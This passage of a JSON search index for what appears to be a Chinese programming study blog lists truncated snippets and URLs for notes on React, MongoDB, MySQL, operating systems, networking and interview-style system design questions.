因为我们","lvl0":"面试常问","lvl1":["其他","智力题"],"lvl2":"摘要","objectID":"7e651f49556d111818b038ecfbccd407","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/01.%E6%99%BA%E5%8A%9B%E9%A2%98/02.%E9%9D%A2%E8%AF%95%E5%B8%B8%E9%97%AE/"},{"content":"04. Hook规则 Hook 本质就是 JavaScript 函数，但是在使用它时需要遵循两条规则。我们提供了一个 linter 插件来强制执行这些规则： 只在最顶层使用 Hook 不要在循环，条件或嵌","lvl0":"Hook规则","lvl1":["《React》笔记","Hook"],"lvl2":"摘要","objectID":"8caacfd9166a988fd06ec5b146a919d3","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/03.hook/04.hook%E8%A7%84%E5%88%99/"},{"content":"03. 使用Effect Hook（副作用钩子） 如果你熟悉 React class 的生命周期函数，你可以把 useEffect Hook 看做 componentDidMount(挂载完成)，com","lvl0":"使用Effect Hook","lvl1":["《React》笔记","Hook"],"lvl2":"摘要","objectID":"add11e584e80349bab812ed01d73e17d","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/03.hook/03.%E4%BD%BF%E7%94%A8effect-hook/"},{"content":"02. 使用State Hook 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import React, { useState } from \u0026#39;react\u0026#39;; function Example() { // 声明一个叫 \u0026#34;count\u0026#34; 的 state 变量 const [count, setCount] = useState(0); return ( \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;You clicked {count} times\u0026lt;/p\u0026gt; \u0026lt;button onClick={() =\u0026gt; setCount(count + 1)}\u0026gt; Click me \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; ); } 我","lvl0":"使用State Hook","lvl1":["《React》笔记","Hook"],"lvl2":"摘要","objectID":"7e9ab5e038ad0c93531a50c70f075d25","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/03.hook/02.%E4%BD%BF%E7%94%A8state-hook/"},{"content":"05. 自定义 Hook 通过自定义 Hook，可以将组件逻辑提取到可重用的函数中。 目前为止，在 React 中有两种流行的方式来共享组件之间的状态逻辑: render props 和高阶组件，","lvl0":"自定义 Hook","lvl1":["《React》笔记","Hook"],"lvl2":"摘要","objectID":"3639b54a312ca63051c9496120951714","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/03.hook/05.%E8%87%AA%E5%AE%9A%E4%B9%89-hook/"},{"content":"常用操作命令 数据库操作命令 1 2 3 4 5 6 7 8 9 10 11 12 13 # 查看数据库 show dbs; # 切换数据库（如果没有对应的数据库则创建） use 数据库名; # 创建集合 db.c","lvl0":"常用命令","lvl1":["数据库","MongoDB"],"lvl2":"摘要","objectID":"64d8febf5dba40efe8deae9294e7f47c","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/03.mongodb/6.%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"content":"MongoDB体系结构 MongoDB的体系结构如下所示：磁盘文件经过加载之后后形成 MongoDB 实例，一个 MongoDB 实例中可以存放多个数据库（图中的MongoD","lvl0":"体系和架构","lvl1":["数据库","MongoDB"],"lvl2":"摘要","objectID":"db105970320b167eeff46af9a9c96041","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/03.mongodb/5.%E4%BD%93%E7%B3%BB%E5%92%8C%E6%9E%B6%E6%9E%84/"},{"content":"MongoDB集群 MongoDB有三种集群的搭建方式 Replica Set 副本集 Sharding 切片 Master-Slaver 主从（不推荐使用） 其中，Sharding集群也是三种集群中最复杂的。副","lvl0":"分布式和集群","lvl1":["数据库","MongoDB"],"lvl2":"摘要","objectID":"f64ef9625ee95b86a21e7a6e5a0339ed","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/03.mongodb/4.%E5%88%86%E5%B8%83%E5%BC%8F%E5%92%8C%E9%9B%86%E7%BE%A4/"},{"content":"MongoDB也是有索引的 索引是对数据库一列或多列值进行排序的存储结构，底层一般是一种树状结构，没有索引查询会进行全表扫描，数据量大的时候会","lvl0":"索引","lvl1":["数据库","MongoDB"],"lvl2":"摘要","objectID":"7de1c56c6f6efebb9fa7b01f67c4c6fb","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/03.mongodb/3.%E7%B4%A2%E5%BC%95/"},{"content":"存储引擎介绍 MongoDB支持的引擎有：WiredTiger，MMAPv1和In-Memory。 从MongoDB 3.2 版本开始，WiredTig","lvl0":"存储引擎","lvl1":["数据库","MongoDB"],"lvl2":"摘要","objectID":"bf411955f503fa443ac026ac58328fe3","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/03.mongodb/2.%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"content":"主要参考下面几个链接 如何设计一个亿级消息量的IM系统 - InfoQ 写作平台 一个海量在线用户即时通讯系统（IM）的完整设计Plus - 云+社区 - 腾讯云 (tencent.com) .","lvl0":"设计一个IM系统","lvl1":["其他","业务问题"],"lvl2":"摘要","objectID":"c828c43430459867c47892cd8b552fbd","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/02.%E4%B8%9A%E5%8A%A1%E9%97%AE%E9%A2%98/3.%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AAim%E7%B3%BB%E7%BB%9F/"},{"content":"可以参考下面这几个 如何设计并实现一个db连接池？ (juejin.cn)","lvl0":"设计一个数据库连接池","lvl1":["其他","业务问题"],"lvl2":"摘要","objectID":"58db918a0ebd3907fd3603927572553b","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/02.%E4%B8%9A%E5%8A%A1%E9%97%AE%E9%A2%98/4.%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0/"},{"content":"Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分","lvl0":"JWT","lvl1":["其他","一些技术"],"lvl2":"摘要","objectID":"5d66d98b97b9d234c728d30dc364f5bd","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/03.%E4%B8%80%E4%BA%9B%E6%8A%80%E6%9C%AF/1.jwt/"},{"content":"MongoDB是由哪种语言写的 MongoDB用c++编写的，流行的开源数据库MySQL也是用C++开发的。C++1983年发行是一种使用广泛","lvl0":"面试问题汇总","lvl1":["数据库","MongoDB"],"lvl2":"摘要","objectID":"cc50303c9cf06df18a46fc36081da814","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/03.mongodb/1.%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"},{"content":"内存管理 什么是缓冲区溢出？有什么危害？其原因是什么？ 缓冲区溢出是指当计算机向缓冲区填充数据时超出了缓冲区本身的容量，溢出的数据覆盖在合法数据","lvl0":"面试问题整理","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"4ded7b367bdacf7664902417e0e18988","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/7.%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/"},{"content":"TLS是啥 SSL/TLS协议其实就是一个安全通信的协议，https采用的就是这个协议来实现安全传输，这个地方主要会问你https的工作原理 TLS","lvl0":"安全相关","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"ef3c77da87cd4ad22333a39475ea190a","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/7.%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"},{"content":"01. Hook概述 Hook可以让你在不编写 class 的情况下使用 state 以及其他的 React 特性。 什么是 Hook? Hook 是一个特殊的函数，可以让你在函数组件里“钩入” React state 及 生命周","lvl0":"Hook概述","lvl1":["《React》笔记","Hook"],"lvl2":"摘要","objectID":"9db98a61e1782164faef130b03833761","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/03.hook/01.hook%E6%A6%82%E8%BF%B0/"},{"content":"","lvl0":"面试题","lvl1":["数据库","Redis"],"lvl2":"摘要","objectID":"5d399c29c3e481f2e26801413c1cdbeb","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/7.%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"content":"引用类型有哪些？有什么区别？ 引用类型主要分为强软弱虚四种： 强引用指的就是代码中普遍存在的赋值方式，比如A a = new A()这种。强引用关联的对象，","lvl0":"其他","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"075646936f965ab55e3e8af1723bcb16","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/12.%E5%85%B6%E4%BB%96/"},{"content":"知乎上就有好多现成的例子，我就拿敖丙的来举例吧 秒杀系统会遇到的几个问题 高并发 超卖 恶意请求 链接暴露 暴露了请求地址，被人恶意请求 数据库 请求太多，","lvl0":"秒杀系统设计","lvl1":["其他","业务问题"],"lvl2":"摘要","objectID":"c023ba261891d1101ae99a2449c97bf4","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/02.%E4%B8%9A%E5%8A%A1%E9%97%AE%E9%A2%98/2.%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"},{"content":"这个其实可以使用事务来实现，比如我们可以用MySQL，抢红包时先开启事务，然后加上行锁，修改完毕后我们提交事务，释放行锁 或者我们可以使用Re","lvl0":"设计一个抢红包功能","lvl1":["其他","业务问题"],"lvl2":"摘要","objectID":"1b61ec5e18b475c1eae67b43969ef394","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/02.%E4%B8%9A%E5%8A%A1%E9%97%AE%E9%A2%98/1.%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E6%8A%A2%E7%BA%A2%E5%8C%85%E5%8A%9F%E8%83%BD/"},{"content":"下图是MySQL底层的一个简单的概括图 日志部分 主要就是这部分了，下面简单介绍一下mysql的三种日志 三种日志 bin log 主要记录所有数据库表结构变更","lvl0":"MySQL底层","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"0721b2f6a7a4b5f9ee5c4ebb173cf720","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/9.mysql%E5%BA%95%E5%B1%82/"},{"content":"案例演示 本节内容根据官方文档的 教程 编写。 在线demo 案例代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40","lvl0":"案例演示","lvl1":["《React》笔记","案例演示"],"lvl2":"摘要","objectID":"77e2d1df2ec530cbb817f630a415b682","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/04.%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA/01.%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA/"},{"content":"11.React哲学（编写一个复杂组件的原则） React 最棒的部分之一是引导我们思考如何构建一个应用。在这篇文档中，我们将会通过 React 构建一个可搜索的产","lvl0":"React哲学","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"9115f5b647a86edb647cd067ff1a152f","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/11.react%E5%93%B2%E5%AD%A6/"},{"content":"10.组合vs继承 React 有十分强大的组合模式。我们推荐使用组合而非继承来实现组件间的代码重用。 包含关系 (组件组合) 有些组件无法提前知晓它们子组件","lvl0":"组合vs继承","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"fbb4bfcbcb94f2e3742ce14b0e36b0bf","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/10.%E7%BB%84%E5%90%88vs%E7%BB%A7%E6%89%BF/"},{"content":"09. 状态提升 (共享状态) 通常，多个组件需要反映相同的变化数据，这时我们建议将共享状态提升到最近的共同父组件中去。 在 React 中，将多个组件中需要共享的","lvl0":"状态提升 (共享状态)","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"af8eae9a59709d6fdf5bb4e47626057a","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/09.%E7%8A%B6%E6%80%81%E6%8F%90%E5%8D%87/"},{"content":"","lvl0":"《React》笔记","lvl1":null,"lvl2":"摘要","objectID":"3ec27e5930ea74876cae738290cfeea7","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/25.react%E7%AC%94%E8%AE%B0/"},{"content":"01.高级指引","lvl0":"高级指引","lvl1":["《React》笔记","高级指引"],"lvl2":"摘要","objectID":"ba190d9896046546d6e677e61cfe33fa","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/02.%E9%AB%98%E7%BA%A7%E6%8C%87%E5%BC%95/01.%E9%AB%98%E7%BA%A7%E6%8C%87%E5%BC%95/"},{"content":"工人分金条 分蛋糕 过桥问题 黑白帽子 首先就是第一次如果都是白色，那么自己肯定是黑色的。但是没有声音，所以就可以肯定至少有两顶黑帽子，如果有个人发","lvl0":"世界500强的智力题","lvl1":["其他","智力题"],"lvl2":"摘要","objectID":"48894f3a6b3d20bbbd34b2b57ef19990","tags":[""],"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/01.%E6%99%BA%E5%8A%9B%E9%A2%98/01.%E4%B8%96%E7%95%8C500%E5%BC%BA%E7%9A%84%E6%99%BA%E5%8A%9B%E9%A2%98/"},{"content":"01. JSX简介 什么是JSX？ 1 const element = \u0026lt;h1\u0026gt;Hello, world!\u0026lt;/h1\u0026gt;; 以类似模板语法的方式描述UI的一种语法。它是JS的语法糖，本质上也是JS。可以在其中使用变量或表达式、","lvl0":"JSX简介","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"609b091c96271eaab1e2c36dc181e004","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/01.jsx%E7%AE%80%E4%BB%8B/"},{"content":"04. State \u0026amp; 生命周期 State 与 props 类似，但是 state 是私有的，并且完全受控于当前组件. State类似于vue中的data选项 将函数组件转换成 class 组件 在没有useS","lvl0":"State\u0026生命周期","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"86c3d7e4276b706b18f3eef06f6a6429","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/04.state%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"},{"content":"08. 表单 受控组件（双向数据绑定） 在 HTML 中，表单元素（如\u0026lt;input\u0026gt;、 \u0026lt;textarea\u0026gt; 和 \u0026lt;select\u0026gt;）通常自己维护 state，并根","lvl0":"表单","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"37a181f7ddf84d199998d263d7a62979","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/08.%E8%A1%A8%E5%8D%95/"},{"content":"07. 列表 \u0026amp; Key 如下代码，我们使用 map() 函数让数组中的每一项变双倍，然后我们得到了一个新的列表 doubled 并打印出来： 1 2 3 const numbers = [1, 2, 3, 4, 5]; const doubled = numbers.map((number) =\u0026gt; number * 2); console.log(doubled); 在","lvl0":"列表\u0026Key","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"cf7635a01bdb1c1ba9d79fa8f71e22f1","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/07.%E5%88%97%E8%A1%A8key/"},{"content":"05. 事件处理 与传统HTML绑定事件的区别 传统的 HTML： 1 2 3 \u0026lt;button onclick=\u0026#34;activateLasers()\u0026#34;\u0026gt; Activate Lasers \u0026lt;/button\u0026gt; 在 React 中略微不同： 1 2 3 4 // 1.事件名为小驼峰； 2.传入函数以大括号包裹","lvl0":"事件处理","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"7b8e781edae48fc3b1364166a8685d92","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/05.%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86/"},{"content":"06. 条件渲染 React 中的条件渲染和 JavaScript 中的一样，使用 JavaScript 运算符 if 或者条件运算符去创建元素来表现当前的状态，然后让 React 根据它们来更新 UI。 观察这两个组件: 1","lvl0":"条件渲染","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"e53240e6bcdf0fa4a0d06b67c740c557","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/06.%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/"},{"content":"02. 元素渲染 元素是构成 React 应用的最小砖块，描述了你在屏幕上想看到的内容。 1 const element = \u0026lt;h1\u0026gt;Hello, world\u0026lt;/h1\u0026gt;; 与浏览器的 DOM 元素不同，React 元素是创建开销极小的普通对象","lvl0":"元素渲染","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"280262aa559cda5a4a1e9a2674ce3837","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/02.%E5%85%83%E7%B4%A0%E6%B8%B2%E6%9F%93/"},{"content":"03. 组件 \u0026amp; Props 函数组件与 class 组件 1.函数组件 1 2 3 function Welcome(props){ return \u0026lt;h1\u0026gt;Hello, {props.name}\u0026lt;/h1\u0026gt; } 该函数是一个有效的React组件。接收唯一带有数据的props参数，并返回一个Rea","lvl0":"组件\u0026Props","lvl1":["《React》笔记","核心概念"],"lvl2":"摘要","objectID":"796224f2a1183fde6ec6aed04459b584","tags":["React"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/12.react%E7%AC%94%E8%AE%B0/01.%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/03.%E7%BB%84%E4%BB%B6props/"},{"content":"操作系统相关 冯诺伊曼体系 该思想约定了用二进制进行计算和存储，还定义计算机基本结构为 5 个部分，分别是中央处理器（CPU）、内存、输入设备、输出","lvl0":"其他","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"987845eb0617162b428d2f0d0b8106d6","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/6.%E5%85%B6%E4%BB%96/"},{"content":"同学的一次面试 内存溢出的两种问题及原因 java.lang.OutOfMemoryError 方法区主要存储类的元信息，实现在元数据区。当JVM发现元数据区没有足够的空间分配给加载的类时，抛出该","lvl0":"面试题","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"21dae96d4b72dcb8c1f87555937a700a","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/11.%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"content":"不知道从哪找的 浏览器禁用 Cookie怎么保存状态 此时无法使用 Cookie 来保存用户信息，只能使用 Session。除此之外，不能再将 Session ID 存放到 Cookie 中，而是","lvl0":"高频面试题总结","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"e1766e482415765596d698ba6cf69351","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/6.%E9%AB%98%E9%A2%91%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/"},{"content":"不知道从哪里抄的 如何查看表格定义的所有索引 SHOW INDEX FROM \u0026lt;tablename\u0026gt;; LIKE 声明中的％和 _ 是什么意思？ ％对应于 0 个或更多字符，_只是 LIKE 语句中的一个字符。 如何在 Unix 和 MySQL","lvl0":"高频面试题","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"ecc0bfbacdcee01f257c2b4c6391da5c","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/8.%E9%AB%98%E9%A2%91%E9%9D%A2%E8%AF%95%E9%A2%98/"},{"content":"细说指针 让你不再害怕指针——C指针详解(经典,非常详细)_程序老兵的博客-CSDN博客_c指针详解经典非常详细 1 2 3 4 5 6 7 8 9 int p; //这是","lvl0":"指针问题","lvl1":["程序语言","C语言"],"lvl2":"摘要","objectID":"6c7d1f7693200b20c384c80ad9e238e1","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/03.cc++%E8%AF%AD%E8%A8%80/01.%E6%8C%87%E9%92%88%E9%97%AE%E9%A2%98/"},{"content":"主从复制 将主数据库中的DDL和DML操作通过二进制日志（BINLOG）传输到从数据库上，然后将这些日志重新执行（重做）；从而使得从数据库的数","lvl0":"分布式和备份","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"3eecb7fbc843341d211e4b6d79942620","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/7.%E5%88%86%E5%B8%83%E5%BC%8F%E5%92%8C%E5%A4%87%E4%BB%BD/"},{"content":"Linux IO模式 linux有下面五种网络模式 阻塞 I/O（blocking IO） 默认socket就是阻塞IO，当用户进程调用了recvfrom这个系","lvl0":"IO管理","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"431b31cd6da94ba077b34a87360f6b79","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/5.io%E7%AE%A1%E7%90%86/"},{"content":"CPU cache结构和缓存一致性（MESI协议） 在多核CPU中，内存中的数据会在多个核心中存在数据副本，某一个核心发生修改操作，就产生了数据不一","lvl0":"互斥和同步","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"48f526c864db4f13b5f0367e1c44efc2","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E4%BA%92%E6%96%A5%E5%92%8C%E5%90%8C%E6%AD%A5/"},{"content":"基本概念 进程和线程的区别 进程：进程是系统进行资源分配和调度的一个独立单位，是系统中的并发执行的单位 线程：线程是进程的一个实体，也是 CPU 调度和分","lvl0":"进程和线程","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"1e8feff209812022022ce674e040974a","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/"},{"content":"基本概念 内存分页和内存分段 内存分页分为一个页号还有一个偏移量，我们通过页号查找页表，找出对应地址，然后加上偏移量就可以得到最终地址 内存分段的","lvl0":"内存管理","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"8c38a62fba6c1ee0afe0eb0980f3612d","tags":["操作系统"],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/4.%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"content":"基本概念 产生死锁的原因 根本原因 就是系统能够提供的资源个数比要求该资源的进程数要少 基本原因 资源竞争和进程推进顺序不合理 产生死锁必要条件 互斥 一个","lvl0":"死锁和饥饿","lvl1":["基础学科","操作系统"],"lvl2":"摘要","objectID":"c4cdefafdb0ef7195de61191f83eec4f","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/01.%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/3.%E6%AD%BB%E9%94%81%E5%92%8C%E9%A5%A5%E9%A5%BF/"},{"content":"七层模型 五层模型 网络协议三要素 语法：即数据与控制信息的结构或格式。 语义：即需要发出何种控制信息，完成何种动作以及做出何种响应。 同步：即事件实","lvl0":"体系结构","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"92a8663a1ea2e2d7534d45cfe946c8a0","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1.%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"content":"ARP协议和ARP攻击 arp 协议的全称 arp协议： address resolution protocol , 地址解析协议 resolve : 解析的意思 ARP协议完成了IP地址与物理地址的映射。每一个主机都设有一","lvl0":"网络层(IP,ICMP,ARP)","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"893e9cbc7aa9b831fcc4ce75808be267","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/3.%E7%BD%91%E7%BB%9C%E5%B1%82ipicmparp/"},{"content":"HTTP协议特点 HTTP和HTTPS的区别 端口不同：HTTP使用的是80端口，HTTPS使用443端口； HTTP认证机制，更加安全； HTTP","lvl0":"应用层(HTTP,SMTP)","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"516ad3ebcd543cbae50b348ae0fa7c20","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/5.%E5%BA%94%E7%94%A8%E5%B1%82httpsmtp/"},{"content":"硬件层分为物理层和数据链路层 三种通讯方式 通信的三种基本方式：单工、半双工、双工 物理层几大特性 （1） 机械特性：指明接口所用接线器的形状和尺寸、","lvl0":"硬件层","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"131fd0138fb2094d5845a7fdcbe5bd5b","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/2.%E7%A1%AC%E4%BB%B6%E5%B1%82/"},{"content":"TCP的三次握手 问题1 TCP可以建立两次握手嘛 不可以。有两个原因：首先，可能会出现已失效的连接请求报文段又传到了服务器端。 其次，两次握手无法","lvl0":"运输层(TCP,UDP)","lvl1":["基础学科","计算机网络"],"lvl2":"摘要","objectID":"923062530747acf749f5b8bbb9efeaae","tags":[""],"url":"https://lyr-2000.github.io/post/03.%E5%9F%BA%E7%A1%80%E5%AD%A6%E7%A7%91/02.%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/4.%E8%BF%90%E8%BE%93%E5%B1%82tcpudp/"},{"content":"SQL语句分为哪几类 数据定义语言DDL（Data Ddefinition Language）CREATE，DROP，ALTER 主要为以上操作 